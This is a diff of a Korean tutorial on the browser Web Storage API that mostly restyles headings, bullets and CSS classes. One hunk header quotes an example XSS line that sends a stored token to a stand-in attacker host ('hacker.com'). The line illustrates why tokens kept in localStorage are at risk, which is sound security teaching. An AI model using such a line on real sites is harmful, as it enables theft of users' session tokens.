@@ -60,10 +60,10 @@ p:has(> strong:only-child)+p,p:has(> strong:only-child)+ul,p:has(> strong:only-c
 ## 🎯 학습 목표
 
 <div class="wda-goal" style="position:relative;overflow:visible;">
-  <strong>Web Storage API</strong> — 클라이언트 저장소의 **개념과 필요성**을 이해합니다.<br>
-  <strong>수명과 범위</strong> — localStorage와 sessionStorage의 **데이터 유지 기간 차이**를 구분합니다.<br>
-  <strong>JSON 직렬화</strong> — 객체 데이터를 저장하기 위해 **문자열로 변환**하는 방법을 익힙니다.<br>
-  <strong>실무 활용</strong> — 다크 모드 설정이나 장바구니 같은 **실제 기능**을 구현합니다.
+  • <strong>Web Storage API</strong> — 클라이언트 저장소의 **개념과 필요성**을 이해합니다.<br>
+  • <strong>수명과 범위</strong> — localStorage와 sessionStorage의 **데이터 유지 기간 차이**를 구분합니다.<br>
+  • <strong>JSON 직렬화</strong> — 객체 데이터를 저장하기 위해 **문자열로 변환**하는 방법을 익힙니다.<br>
+  • <strong>실무 활용</strong> — 다크 모드 설정이나 장바구니 같은 **실제 기능**을 구현합니다.
 </div>
 
 ---
@@ -215,7 +215,7 @@ localStorage.clear(); // 모든 데이터가 초기화됨
 
 **"localStorage와 쌍둥이지만, 성격(수명)만 다릅니다."**
 
-### 1) 코드 예시 (Code Example)
+**🧪 예시 코드**
 
 메서드 이름 앞의 객체만 `sessionStorage`로 바꾸면 됩니다.
 
@@ -346,7 +346,7 @@ console.log(savedUser.name); // '홍길동' (성공!)
 
 **개념 정리**
 
-<div class="wda-callout wda-cy">
+<div class="wda-callout wda-ci">
   <strong>직렬화(Serialization)</strong> : 복잡한 데이터(객체, 배열 등)를 한 줄의 기차처럼 <strong>일렬로 나열된 문자열</strong>로 만드는 과정입니다. 마치 이사 갈 때 가구를 분해해서 상자에 넣는 것과 비슷합니다.<br><br>
   <strong>역직렬화(Deserialization)</strong> : 문자열로 된 데이터를 다시 원래의 사용할 수 있는 객체 형태로 조립하는 과정입니다. 이사 간 집에서 가구를 다시 조립하는 것과 같습니다.
 </div>
@@ -357,7 +357,7 @@ console.log(savedUser.name); // '홍길동' (성공!)
   <h2>🛠️ 실무 활용 : 다크모드 구현</h2>
 </div>
 
-### 1) 구현 코드 (핵심 로직)
+**📝 구현 코드 (핵심 로직)**
 
 - **기본 원리**: 버튼을 누를 때마다 테마 상태를 변경하고, 그 상태를 `localStorage`에 저장하여 **새로고침 해도 설정이 유지**되도록 합니다.
 - **초기화 로직**: 페이지가 처음 로드될 때 저장된 설정이 있는지 확인하고, 없으면 기본값('light')을 적용합니다.
@@ -630,7 +630,7 @@ fetch(`https://hacker.com?steal=${token}`);
 
 **개념 정리**
 
-<div class="wda-callout wda-cy">
+<div class="wda-callout wda-ci">
   <strong>XSS (Cross Site Scripting)</strong> — '크로스 사이트 스크립팅'이라고 읽습니다. 해커가 게시판 댓글이나 입력창 등에 악성 자바스크립트 코드를 심어놓고, 이 글을 보는 다른 사용자의 브라우저에서 그 코드가 실행되게 하여 정보를 탈취하는 해킹 수법입니다.<br><br>
   <strong>HttpOnly Cookie</strong> — 일반적인 쿠키와 달리, 브라우저가 서버와 통신할 때만 자동으로 사용하고 자바스크립트로는 건드릴 수 없게 만든 '보안 강화 쿠키'입니다. 금고 열쇠를 사용자(JS)에게 주지 않고 은행(브라우저)이 직접 관리하는 것과 비슷합니다.
 </div>
@@ -659,7 +659,7 @@ fetch(`https://hacker.com?steal=${token}`);
 
 **개념 정리**
 
-<div class="wda-callout wda-cy">
+<div class="wda-callout wda-ci">
   <strong>ITP (Intelligent Tracking Prevention)</strong> — 애플이 사용자의 개인정보 보호를 위해 만든 추적 방지 기술입니다. 광고 회사가 쿠키나 스토리지 등을 이용해 사용자를 끈질기게 따라다니며 정보를 수집하는 것을 막기 위해, 오랫동안 접속하지 않은 사이트의 데이터를 강제로 지워버리는 강력한 정책입니다.
 </div>
 
@@ -843,7 +843,7 @@ document.cookie = "theme=dark; path=/";
 ---
 
 <div style="position:relative;overflow:visible;margin:1.5rem 0 0.5rem;">
-  <h2>💡 핵심 정리 (Summary)</h2>
+  <h2>✅ 핵심 요약</h2>
 </div>
 
 <table class="wda-summary-table">
